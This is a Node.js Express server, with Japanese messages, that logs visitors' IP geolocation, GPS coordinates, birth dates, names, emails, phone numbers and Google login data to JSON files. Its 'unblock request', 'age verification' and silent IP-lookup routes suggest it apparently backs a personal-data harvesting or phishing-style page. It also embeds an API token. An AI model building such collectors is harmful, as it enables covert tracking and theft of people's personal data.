const express = require("express");
const cors = require("cors");
const axios = require("axios");
const rateLimit = require("express-rate-limit");
const fs = require("fs");
const path = require("path");
const helmet = require('helmet');

const app = express();
const port = 9001;

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 200,
  message: "リクエストが多すぎます。後でもう一度お試しください。",
});

app.use(cors());
app.set('trust proxy', true);

app.use(helmet());
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"], 
      scriptSrc: [
        "'self'",
        "'sha256-5+YTmTcBwCYdJ8Jetbr6kyjGp0Ry/H7ptpoun6CrSwQ='", 
        "'unsafe-inline'", 
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);

app.use(express.json());
app.use(limiter);

const logDir = path.join(__dirname, "log");
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true });
}

function saveDataToJsonFile(dataType, data) {
  let currentDate = new Date();
  currentDate.setHours(currentDate.getHours());

  const year = currentDate.getFullYear();
  const month = String(currentDate.getMonth() + 1).padStart(2, "0");
  const day = String(currentDate.getDate()).padStart(2, "0");
  const hours = String(currentDate.getHours()).padStart(2, "0");
  const minutes = String(currentDate.getMinutes()).padStart(2, "0");
  const seconds = String(currentDate.getSeconds()).padStart(2, "0");

  const timestamp = `${year}-${month}-${day} ${hours}-${minutes}-${seconds}`;
  const fileName = `${timestamp} ${dataType}.json`;
  const filePath = path.join(logDir, fileName);
  const jsonData = {
    timestamp,
    data,
  };

  fs.writeFileSync(
    filePath,
    JSON.stringify(jsonData, null, 2),
    "utf8",
    (err) => {
      if (err) {
        console.error("ファイルの書き込みエラー:", err);
      }
    }
  );
}

app.get("/api/get-ip-location", async (req, res) => {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (ip === "::1") {
    ip = "127.0.0.1";
  }

  try {
    const response = await axios.get(
      `https://ipinfo.io/${ip}?token=2693444c3b2619`
    );
    const data = response.data;

    console.log(`IP情報: ${JSON.stringify(data, null, 2)}`);

    console.log({
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country,
      loc: data.loc,
      org: data.org,
      timezone: data.timezone,
    });

    const completeData = {
      clientIp: ip,
      ...data,
    };

    saveDataToJsonFile("IP Location", completeData);

    res.status(200).json({ message: "IP位置情報が保存されました。" });
  } catch (error) {
    console.error("IP情報の取得に失敗しました。", error);
    res.status(500).send("IP情報の取得に失敗しました。");
  }
});

app.post("/api/location", (req, res) => {
  const { latitude, longitude } = req.body;

  if (!latitude || !longitude) {
    console.log({ message: "緯度と経度の情報が必要です。" });
    return res.status(400).send({ message: "緯度と経度の情報が必要です。" });
  }

  const receivedData = {
    latitude,
    longitude,
    type: "Location data",
  };

  console.log(`受信した緯度: ${latitude}, 経度: ${longitude}`);
  console.log({ message: "位置情報が正常に受信されました。" });

  saveDataToJsonFile("Location Data", receivedData);

  res.status(200).send({ message: "位置情報が保存されました。" });
});

app.post("/api/verify-age", (req, res) => {
  const { year, month, day } = req.body;

  if (!year || !month || !day) {
    console.log({ message: "生年月日を正確に入力してください。" });
    return res
      .status(400)
      .send({ message: "生年月日を正確に入力してください。" });
  }

  const receivedData = {
    year,
    month,
    day,
    type: "Age Verification",
  };

  console.log(`生年月日: ${year}-${month}-${day}`);
  console.log({ message: "生年月日の確認が完了しました。" });

  saveDataToJsonFile("Age Verification", receivedData);

  return res.status(200).send({ message: "生年月日が保存されました。" });
});

app.post("/api/unblock-request", (req, res) => {
  const { lastName, firstName, email, phone } = req.body;

  const receivedData = {
    lastName,
    firstName,
    email,
    phone,
    type: "Unblock Request",
  };

  console.log(`姓: ${lastName}`);
  console.log(`名: ${firstName}`);
  console.log(`メール: ${email}`);
  console.log(`電話番号: ${phone}`);

  saveDataToJsonFile("Unblock Request", receivedData);

  res
    .status(200)
    .json({ message: "ブロック解除リクエストが正常に受信されました！" });
});

app.post("/api/google-login", (req, res) => {
  const userData = req.body;

  console.log("受信したGoogleユーザーデータ:", userData);

  saveDataToJsonFile("Google Login", userData);

  res.status(200).send({ message: "ユーザーデータが正常に受信されました" });
});

app.post("/api/contact", (req, res) => {
  const { name, email, message } = req.body;

  if (!name || !email || !message) {
    return res.status(400).json({
      success: false,
      message: "名前、メールアドレス、お問い合わせ内容を全て入力してください。",
    });
  }

  console.log("お問い合わせデータ:", {
    name,
    email,
    message,
  });

  saveDataToJsonFile("ContactUs Data", req.body);

  res.status(200).json({
    success: true,
    message: "お問い合わせが正常に送信されました。",
  });
});

app.listen(port, () => {
  console.log(`サーバーが http://localhost:${port} で実行されています。`);
});
